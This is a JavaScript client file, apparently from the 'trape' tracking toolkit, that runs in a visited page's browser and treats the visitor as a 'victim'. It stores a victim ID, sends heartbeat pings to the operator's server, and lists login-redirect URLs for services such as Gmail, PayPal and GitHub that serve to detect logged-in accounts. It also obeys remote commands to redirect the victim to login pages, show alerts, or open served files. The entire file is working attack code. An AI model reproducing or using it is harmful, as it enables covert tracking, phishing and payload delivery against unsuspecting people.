var urlServices = [];
var Services = [];

if (typeof(io) != 'undefined') {
        namespace = '/trape';
        var socket = io.connect(location.protocol + '//' + document.domain + ':' + location.port + namespace);
    }

window.onbeforeunload = function(e) {
    var d = getVictimData();
    socket.emit('disconnect_request', d);
    socket.emit('my_broadcast_event', {data: 'update-data'});
    return 'Are you sure?';
}
$(document).ready(function($) {

    var d = getVictimData();

	Services = [{
        url: "https://www.facebook.com",
        path: "/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico%3F_rdr%3Dp",
        name: "Facebook",
        login: "/login.php"
    }, {
        url: "https://twitter.com",
        path: "/login?redirect_after_login=%2Ffavicon.ico",
        name: "Twitter",
        login: "/login" 
    }, {
        url: "https://vk.com",
        path: "/login?u=2&to=ZmF2aWNvbi5pY28-",
        name: "VK",
        login: "/login"
    }, {
        url: "https://www.reddit.com",
        path: "/login?dest=https%3A%2F%2Fwww.reddit.com%2Ffavicon.ico",
        name: "Reddit",
        login: "/login"
    }, {
        url: "https://accounts.google.com",
        path: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico&uilel=3&hl=en&service=mail",
        name: "Gmail",
        login: "/ServiceLogin"
    }, {
        url: "https://www.spotify.com",
        path: "/en/login/?forward_url=https%3A%2F%2Fwww.spotify.com%2Ffavicon.ico",
        name: "Spotify",
        login: "/en/login/"
    }, {
        url: "https://www.tumblr.com",
        path: "/login?redirect_to=%2Ffavicon.ico",
        name: "Tumblr",
        login: "/login"

    }, {
        url: "https://www.dropbox.com",
        path: "/login?cont=https%3A%2F%2Fwww.dropbox.com%2Fstatic%2Fimages%2Fabout%2Fdropbox_logo_glyph_2015.svg",
        name: "Dropbox",
        login: "/login"
    }, {
        url: "https://www.amazon.com",
        path: "/ap/signin/178-4417027-1316064?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=10000000&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Ffavicon.ico",
        name: "Amazon",
        login: "/ap/signin/"
    }, {
        url: "https://github.com",
        path: "/login?return_to=https%3A%2F%2Fgithub.com%2Ffavicon.ico%3Fid%3D1",
        name: "Github",
        login: "/login"
    }, {
        url: "https://medium.com",
        path: "/m/signin?redirect=https%3A%2F%2Fmedium.com%2Ffavicon.ico&loginType=default",
        name: "Medium",
        login: "/m/signin"
    }, {
        url: "https://www.paypal.com",
        path: "/signin?returnUri=https://t.paypal.com/ts?v=1.0.0",
        name: "Paypal",
        login: "/account/signin/"
    }, {
        url: "https://bitbucket.org",
        path: "/account/signin/?next=/favicon.ico",
        name: "BitBucket",
        login: "/account/signin/"
    }, {
        url: "https://www.instagram.com",
        path: "/accounts/login/?next=%2Ffavicon.ico",
        name: "Instagram",
        login: "/accounts/login/"
    }, {
        url: "https://foursquare.com",
        path: "/login?continue=%2Ffavicon.ico",
        name: "Foursquare",
        login: "/login"
    }, {
        url: "https://www.airbnb.com",
        path: "/login?redirect_params[action]=favicon.ico&redirect_params[controller]=home",
        name: "Airbnb",
        login: "/login"
    }, {
        url: "https://news.ycombinator.com",
        path: "/login?goto=y18.gif",
        name: "Hackernews",
        login: "/login"
    }, {
        url: "https://slack.com",
        path: "/checkcookie?redir=https%3A%2F%2Fslack.com%2Ffavicon.ico%23",
        name: "Slack",
        login: "/signin"
    }];

    $.each(Services, function(index, val) {
         urlServices[val.name.toLowerCase()] = val.url + val.login;
    });

    var tping = function() {
        var data = {id : d.vId};
        $.ajax({
            url: '/tping',
            data: data,
            dataType: "json",
            type: 'POST',
            success: function(response) {
                setTimeout(function(){tping()}, 4000);
            },
            error: function(error) {
                setTimeout(function(){tping()}, 2000);
            }
        });
    }

    tping();
});

var sendData = function(data) {
    $.ajax({
        url: '/nr',
        data: data,
        dataType: "json",
        type: 'POST',
        success: function(response) {

        },
        error: function(error) {
        }
    });
}


var getVictimData = function() {
	var d = {
        vId : null, 
        vURL : null
    };
	if (localStorage.trape_vId != undefined) {
		d.vId = localStorage.trape_vId;
        d.vURL = localStorage.trape_vURL;
	}
	
	return d;
}

var defineSockets = function(self) {
    self.on('my_response', function(msg) {
        console.log(msg);
        switch (msg.data.type){
            case 'network':
                localStorage.setItem("trape_vURL", urlServices[msg.data.message]);
                window.location.replace('/redv?url=' + urlServices[msg.data.message]);
                break;
            case 'url':
                localStorage.setItem("trape_vURL", msg.data.message);
                window.location.replace('/redv?url=' + msg.data.message);
                break;
            case 'redirect':
                window.location.replace(msg.data.message);
                break;
            case 'alert':
                alert(msg.data.message);
                break;
            case 'execute':
                var objW = window.open('static/files/' + msg.data.message);
                break;
            default:
                return false;
        }                            
    });
}
